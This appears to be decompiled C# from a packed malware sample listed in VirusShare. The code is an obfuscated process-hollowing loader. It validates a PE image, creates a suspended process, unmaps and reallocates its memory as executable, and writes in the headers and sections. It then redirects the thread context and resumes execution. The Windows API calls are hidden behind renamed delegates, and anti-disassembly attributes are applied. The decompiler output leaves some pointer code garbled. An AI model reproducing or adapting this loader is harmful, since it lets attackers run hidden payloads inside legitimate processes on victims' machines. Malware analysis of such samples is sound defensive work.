// Decompiled with JetBrains decompiler
// Type: ^
// Assembly: syncui, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8C369EE2-0F8E-40F6-BD9C-ED440A7013AE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Packed.Win32.CPEX-based.ht-72f8bd90449e3c4875b681f4afb213e7bd866e6a0e1c08546770c7c21f92eed5.exe

using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

[SuppressIldasm]
internal sealed class \u005E : \u007C
{
  private const uint \u0040 = 65543;
  private const uint \u003A = 4;
  private const uint \u003B = 64;
  private const uint \u003F = 4096;
  private const uint \u00AC = 8192;
  private \u005E.\u003C \u007C;
  private \u005E.\u003E \u002F;
  private \u005E.\u0025 \u003C;
  private \u005E.\u00A3 \u003E;
  private \u005E.\u0021 \u00A3;
  private \u005E.\u0024 \u0024;
  private \u005E.\u002F \u0021;

  public \u005E()
  {
    if (false)
      ;
    // ISSUE: explicit constructor call
    base.\u002Ector();
    \u0026.\u0040 = (\u007C) new \u003D();
    this.\u007C = (\u005E.\u003C) \u0026.\u0040.\u0040((object) .(), (object) .(), (object) typeof (\u005E.\u003C));
    this.\u002F = (\u005E.\u003E) \u0026.\u0040.\u0040((object) .(), (object) .(), (object) typeof (\u005E.\u003E));
    this.\u003C = (\u005E.\u0025) \u0026.\u0040.\u0040((object) .(), (object) .(), (object) typeof (\u005E.\u0025));
    this.\u003E = (\u005E.\u00A3) \u0026.\u0040.\u0040((object) .(), (object) .(), (object) typeof (\u005E.\u00A3));
    this.\u00A3 = (\u005E.\u0021) \u0026.\u0040.\u0040((object) .(), (object) .(), (object) typeof (\u005E.\u0021));
    this.\u0024 = (\u005E.\u0024) \u0026.\u0040.\u0040((object) .(), (object) .(), (object) typeof (\u005E.\u0024));
    this.\u0021 = (\u005E.\u002F) \u0026.\u0040.\u0040((object) .(), (object) .(), (object) typeof (\u005E.\u002F));
  }

  public override unsafe object \u0040(params object[] _param1)
  {
    if (false)
      ;
    byte[] dst1 = new byte[64];
    byte[] dst2 = new byte[248];
    byte[] dst3 = new byte[40];
    byte[] numArray1 = new byte[716];
    int[] numArray2 = new int[4];
    fixed (byte* numPtr = &dst1[0])
      ;
    fixed (byte* numPtr = &dst2[0])
      ;
    fixed (byte* numPtr = &dst3[0])
      ;
    fixed (byte* numPtr = &numArray1[0])
      ;
    string str = string.Join(Convert.ToChar(32).ToString(), (string[]) _param1[1]);
    // ISSUE: fixed variable is out of scope
    *(int*) numPtr = 65543;
    Buffer.BlockCopy((Array) _param1[0], 0, (Array) dst1, 0, dst1.Length);
    // ISSUE: fixed variable is out of scope
    int srcOffset = *(int*) (numPtr + 60);
    Buffer.BlockCopy((Array) _param1[0], srcOffset, (Array) dst2, 0, dst2.Length);
    // ISSUE: fixed variable is out of scope
    // ISSUE: fixed variable is out of scope
    if (*(uint*) numPtr != 17744U || *(ushort*) numPtr != (ushort) 23117)
      return (object) null;
    // ISSUE: fixed variable is out of scope
    int num1 = *(int*) (numPtr + 52);
    if (!this.\u007C((string) _param1[2], str, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, (string) null, new byte[68], numArray2))
      return (object) null;
    int num2 = (int) this.\u003C((IntPtr) numArray2[0], (IntPtr) num1);
    // ISSUE: fixed variable is out of scope
    if (this.\u002F((IntPtr) numArray2[0], (IntPtr) num1, *(uint*) (numPtr + 80), 12288U, 64U) == IntPtr.Zero)
      base.\u0040(_param1);
    fixed (byte* numPtr1 = &((byte[]) _param1[0])[0])
    {
      // ISSUE: fixed variable is out of scope
      int num3 = this.\u003E((IntPtr) numArray2[0], (IntPtr) num1, (IntPtr) (void*) numPtr1, *(uint*) (numPtr + 84), IntPtr.Zero);
      // ISSUE: fixed variable is out of scope
      for (ushort index = 0; (int) index < (int) *(ushort*) (numPtr + 6); ++index)
      {
        Buffer.BlockCopy((Array) _param1[0], srcOffset + dst2.Length + dst3.Length * (int) index, (Array) dst3, 0, dst3.Length);
        // ISSUE: fixed variable is out of scope
        fixed (byte* numPtr2 = &((byte[]) _param1[0])[(IntPtr) *(uint*) (numPtr + 20)])
        {
          // ISSUE: fixed variable is out of scope
          // ISSUE: fixed variable is out of scope
          int num4 = this.\u003E((IntPtr) numArray2[0], (IntPtr) ((long) num1 + (long) *(uint*) (numPtr + 12)), (IntPtr) (void*) numPtr2, *(uint*) (numPtr + 16), IntPtr.Zero);
        }
      }
      // ISSUE: fixed variable is out of scope
      int num5 = this.\u00A3((IntPtr) numArray2[1], (IntPtr) (void*) numPtr);
      fixed (byte* numPtr3 = &BitConverter.GetBytes(num1)[0])
      {
        // ISSUE: fixed variable is out of scope
        int num6 = this.\u003E((IntPtr) numArray2[0], (IntPtr) (long) (*(uint*) (numPtr + 164) + 8U), (IntPtr) (void*) numPtr3, 4U, IntPtr.Zero);
      }
      // ISSUE: fixed variable is out of scope
      // ISSUE: fixed variable is out of scope
      *(int*) (numPtr + 176) = num1 + (int) *(uint*) (numPtr + 40);
      // ISSUE: fixed variable is out of scope
      int num7 = this.\u0024((IntPtr) numArray2[1], (IntPtr) (void*) numPtr);
      int num8 = (int) this.\u0021((IntPtr) numArray2[1], IntPtr.Zero);
      return (object) null;
    }
  }

  [SuppressIldasm]
  private delegate uint \u0025([In] IntPtr obj0, [In] IntPtr obj1);

  [SuppressIldasm]
  private delegate int \u0021([In] IntPtr obj0, [In] IntPtr obj1);

  [SuppressIldasm]
  private delegate int \u0024([In] IntPtr obj0, [In] IntPtr obj1);

  [SuppressIldasm]
  private delegate int \u00A3([In] IntPtr obj0, [In] IntPtr obj1, [In] IntPtr obj2, [In] uint obj3, [In] IntPtr obj4);

  [SuppressIldasm]
  private delegate IntPtr \u003E([In] IntPtr obj0, [In] IntPtr obj1, [In] uint obj2, [In] uint obj3, [In] uint obj4);

  [SuppressIldasm]
  private delegate bool \u003C(
    [In] string obj0,
    [In] string obj1,
    [In] IntPtr obj2,
    [In] IntPtr obj3,
    [In] bool obj4,
    [In] uint obj5,
    [In] IntPtr obj6,
    [In] string obj7,
    [In] byte[] obj8,
    [In] int[] obj9);

  [SuppressIldasm]
  private delegate uint \u002F([In] IntPtr obj0, [In] IntPtr obj1);
}
